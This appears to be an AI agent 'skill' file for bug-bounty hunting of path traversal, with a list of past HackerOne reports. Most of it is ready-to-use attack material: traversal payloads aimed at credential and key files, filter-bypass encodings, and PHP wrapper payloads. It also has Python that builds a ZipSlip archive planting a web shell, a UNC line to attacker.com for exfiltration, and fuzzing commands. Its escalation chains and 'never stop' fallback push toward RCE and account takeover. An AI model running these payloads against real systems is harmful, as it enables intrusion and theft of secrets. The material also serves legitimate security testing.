---
name: hunt-path-traversal
description: "Use this skill when you see file download endpoints, document viewers, image/avatar fetchers, ?file= ?path= ?download= ?template= ?page= ?doc= parameters, archive extraction features (ZIP/TAR upload), S3/CDN proxy endpoints, or any URL where the server reads a file from disk based on user input. Load automatically when traversal patterns (../, %2e%2e%2f) yield differential responses. Only invoke if real impact potential exists (reading /etc/passwd, app secrets, AWS creds, source code with secrets). Skip theoretical findings — directory listing without sensitive content is not a bounty."
type: hunt
---

# Hunt: PATH TRAVERSAL

Read-only arbitrary file read on the server filesystem. Distinct from LFI (which can chain to RCE via include/require). Path traversal disclosure pays when it leaks credentials, source code, cloud metadata files, or session stores.

## Crown Jewel Targets
- `/etc/passwd`, `/etc/shadow` (proves traversal — not impactful alone)
- `/proc/self/environ` — leaks env vars (DB creds, API keys, JWT secrets)
- `~/.aws/credentials`, `~/.ssh/id_rsa`, `~/.docker/config.json`
- `/var/run/secrets/kubernetes.io/serviceaccount/token` (K8s SA token → cluster pivot)
- App config: `/app/.env`, `/var/www/config.php`, `application.properties`, `appsettings.json`, `web.config`
- Source code with hardcoded secrets — `app.py`, `routes.js`, `Dockerfile`
- Session/cookie stores: `/var/lib/php/sessions/sess_<id>` → ATO
- S3 backend: traversal in object key → cross-tenant object read

## Detection Signals
- URL params: `file=`, `path=`, `name=`, `doc=`, `page=`, `template=`, `download=`, `load=`, `read=`, `view=`, `image=`, `style=`, `folder=`, `pg=`, `inc=`, `locate=`, `show=`, `site=`, `type=`, `conf=`
- Endpoints: `/download?`, `/fetch?`, `/render?`, `/proxy?`, `/avatar?`, `/preview?`, `/export?`, `/getfile`, `/static/`, `/files/`, `/uploads/`
- Differential response on `../` injection: 200 with different content, 500 with file-not-found stack trace, base64-encoded binary
- Archive upload features (ZIP, TAR, JAR, WAR, RPM, DEB) — test ZipSlip
- File viewer/preview SaaS — DOCX, PDF, XLSX (often Apache POI / LibreOffice headless)

## Attack Techniques

### 1. Classic dot-dot-slash
Walk up from web root until you hit `/etc/passwd`. Vary depth 1-15.
```
?file=../../../../../../../etc/passwd
?file=....//....//....//etc/passwd   ← strip-once filter bypass
```

### 2. URL encoding (single and double)
Bypasses filters that strip literal `..` or `/`.
```
?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd          ← single-encoded
?file=%252e%252e%252fetc%252fpasswd                    ← double-encoded (server decodes twice)
?file=..%c0%af..%c0%afetc/passwd                       ← UTF-8 overlong
?file=..%ef%bc%8fetc%ef%bc%8fpasswd                    ← Unicode fullwidth slash (U+FF0F)
?file=..%u002fetc%u002fpasswd                          ← IIS Unicode
?file=%c0%2e%c0%2e/etc/passwd                          ← Apache mod_rewrite bypass
```

### 3. Null-byte truncation (PHP < 5.3.4, some Java)
Forces extension check to ignore tail.
```
?file=../../../../etc/passwd%00.png
?file=../../../../etc/passwd\0.jpg
```

### 4. Absolute path bypass
When app prepends nothing or naively concatenates.
```
?file=/etc/passwd
?file=file:///etc/passwd
?file=\\\\attacker.com\\share\\file   ← Windows UNC SMB exfil
?file=C:\\windows\\win.ini
```

### 5. Wrappers (PHP, but often forgotten)
```
?file=php://filter/convert.base64-encode/resource=../../config.php
?file=php://filter/read=convert.base64-encode/resource=index.php
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
?file=expect://id
?file=zip://shell.jpg%23payload.php
```

### 6. ZipSlip in archive extraction
Upload a crafted ZIP whose entries contain `../`. On extraction, files land outside target dir.
```python
import zipfile, os
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../../../../tmp/pwn.sh', '#!/bin/sh\nid')
    z.writestr('../../../../../var/www/html/shell.php', '<?php system($_GET["c"]);?>')
```
Affects: Java `ZipInputStream` (CVE-2018-1002200), Node `unzipper`/`adm-zip`, Python `tarfile.extractall` (CVE-2007-4559), Go `archive/zip`.

### 7. S3 prefix traversal / signed-URL path confusion
When app builds an S3 key from user input:
```
?doc=user/123/../../tenant_999/secret.pdf
```
Or signed URLs where the signature covers a prefix but the resolved key normalizes outside the prefix.

### 8. Path-segment trick on Nginx-alias misconfig
`alias /var/www/static;` with `location /static` — request `/static../etc/passwd` walks above the alias root.

## Payloads
```
../../../../../../../etc/passwd
../../../../../../../etc/shadow
../../../../../../../proc/self/environ
../../../../../../../proc/self/cmdline
../../../../../../../proc/self/cwd/config.py
../../../../../../../var/log/apache2/access.log
../../../../../../../var/log/auth.log
../../../../../../../home/ubuntu/.aws/credentials
../../../../../../../root/.ssh/id_rsa
../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
../../../../../../../sys/class/net/eth0/address
C:\\windows\\system32\\drivers\\etc\\hosts
C:\\windows\\win.ini
C:\\inetpub\\wwwroot\\web.config
```

Windows:
```
..\\..\\..\\..\\..\\windows\\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
```

## Bypass Methods
| Filter | Bypass |
|--------|--------|
| Strips `../` once | `....//....//` or `..././..././` |
| Strips `../` recursively | `..%2f..%2f` then double-encode `%252f` |
| Whitelist file extension | Null byte `%00`, double extension `passwd.png` chained with truncation, or use `%23` (fragment confusion) |
| Whitelist prefix `/safe/` | `/safe/../../etc/passwd` |
| Blocks `/etc/passwd` literal | `/etc/./passwd`, `/etc//passwd`, `/etc/\passwd` |
| WAF blocks `..` | Unicode `../`, overlong UTF-8 `%c0%ae%c0%ae/` |
| Server normalizes path | Use wrappers (`php://`, `file://`) or absolute paths |
| Output encoded as image | `php://filter/convert.base64-encode` then strip header bytes |

## Tools
```bash
# Wordlist fuzz
ffuf -u 'https://target/download?file=FUZZ' -w ~/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0

# Dotdotpwn
dotdotpwn -m http -h target.com -M GET -f /etc/passwd -k 'root:'

# Nuclei templates
nuclei -u https://target -tags lfi,traversal -severity medium,high,critical

# Burp: Intruder with payloads from PayloadsAllTheThings/Directory Traversal/Intruder/
```

## Impact
- **Critical**: AWS keys, K8s SA token, SSH keys, DB credentials, JWT signing secret recovered → full compromise
- **High**: Source code with hardcoded API keys, session files (ATO), `.env` with third-party tokens
- **Medium**: `/etc/passwd` only (no creds), version files, log files without secrets
- **Low / N-A**: Directory listing only, files publicly available elsewhere

## Chain Potential
- Path traversal → JWT signing secret in `.env` → forge admin JWT → ATO
- Path traversal → AWS credentials → enumerate IAM → privesc (hunt-cloud-misconfig)
- ZipSlip → drop file in `/var/www/html/` → RCE (becomes hunt-rce)
- Traversal → read `id_rsa` → SSH into bastion → internal network
- Read `/proc/self/environ` → DB connection string → query as service account
- K8s SA token → cluster API → secret enumeration → pod exec

## Fallback Chain
1. If single `../` fails, try double-URL-encoding (`%252e%252e%252f`), then Unicode fullwidth (`%ef%bc%8f`), then overlong UTF-8 (`%c0%ae`).
2. If `/etc/passwd` returns clean 200 but no content, try `/proc/self/environ` (different read syscall, may bypass extension whitelist).
3. If web-root traversal fails, look for `alias` misconfig (try `/static../`) or wrapper support (`php://filter` returns base64 of even "filtered" PHP files).
4. If file read is dead, pivot to ZipSlip via any upload feature, or test PDF/DOCX generators for embedded path inclusion. Never stop because one technique failed.

## Real-World Reports (from Community Writeups)

| Title | Program | Bounty | Source |
|---|---|---|---|
| Path traversal in Nuget Package Registry → RCE | GitLab | $12,000 | H1 #822262 |
| Path traversal → RCE | GitLab | $12,000 | H1 #733072 |
| Mozilla VPN clients: RCE via file write + path traversal | Mozilla | $6,000 | H1 #2995025 |
| Keybase Win10: write files anywhere via "download attachment" | Keybase | $5,000 | H1 #713006 |
| CVE-2021-41773 Apache 2.4.49 path traversal | IBB | $4,000 | H1 #1394916 |
| Path traversal by monkey-patching Buffer internals | IBB / Node.js | $2,430 | H1 #2434811 |
| Worker container escape → arbitrary file read | Semmle | $2,000 | H1 #694181 |
| Worker container escape → file read (again) | Semmle | $2,000 | H1 #697055 |
| Path traversal, SSTI, RCE on a MailRu acquisition | Mail.ru | $2,000 | H1 #536130 |
| LFI and SSRF via XXE in emblem editor | Rockstar Games | $1,500 | H1 #347139 |
| File writing via actionpack-page_caching → RCE | Ruby on Rails | $1,000 | H1 #519220 |
| Misuse of auth cookie + path traversal on app.starbucks.com | Starbucks | $0 | H1 #876295 |
| Path traversal in filename in LINE Mac client | LY Corporation | $0 | H1 #727727 |
| HTML-injection in PDF-export → LFI | Visma Public | $500 | H1 #809819 |
| Cache Poisoning via uppercase letters in invalid path | InnoGames | $550 | H1 #960618 |
| URL path manipulation → cache poison Amazon Affiliate | Shopify | $500 | H1 #1848940 |
| PUT-based CSRF via Client-Side Path Traversal + Cookie Bomb | Acronis | $600 | H1 #1860380 |
| Path traversal in deeplink → other-user private info | Basecamp | $0 | H1 #2553411 |
| Unauth Path Traversal + Cmd Injection in Trellix ESM | Trellix | $0 | H1 #2817658 |

**PROVEN techniques** (3+ paid reports each):
- **Encoded `../` bypass via `%2e%2e%2f` / `..%252f` / `....//`** — Apache CVE-2021-41773, GitLab Nuget, multiple Starbucks Korea/Singapore.
- **ZipSlip in upload extractors (`../../shell.jsp` inside ZIP)** — Mozilla VPN client #2995025, Ruby on Rails actionpack-page_caching, Vanilla AddonManager.
- **Client-side path traversal (deeplink, attachment, download filename)** — Keybase #713006, LINE Mac #727727, Basecamp #2553411, TikTok Lynxview #2417516.
- **Path traversal → cache poisoning** — InnoGames #960618, Shopify Linkpop #1848940 — uppercase + invalid path normalized differently by edge vs origin.

## High-Value Chains (from Reports)

- **Path traversal → arbitrary file write → RCE** — GitLab Nuget (H1 #822262, $12K) + ROR actionpack-page_caching (H1 #519220, $1K): traversal in stored filename let attacker drop a `.rb`/`.html.erb` into a directory whose contents were later executed/served.
- **Path traversal in deeplink → cross-user PII leak** — Basecamp (H1 #2553411): traversal in a deeplink URL caused private user info to land in a publicly-served directory, single-click exfil.
- **Path traversal → cookie-jar overwrite → SSRF / CSRF chain** — Acronis (H1 #1860380, $600): Client-Side Path Traversal combined with cookie bombing enabled PUT-based CSRF on cloud APIs.
- **Container worker escape via path traversal** — Semmle (H1 #694181, #697055, $2K each): worker accepted file paths from user job spec, traversal escaped sandbox to read host filesystem.
- **Path traversal + auth-cookie misuse → restricted data access** — Starbucks (H1 #876295): mobile-app cookie reused outside intended scope + `../` in a resource path read other-user data.
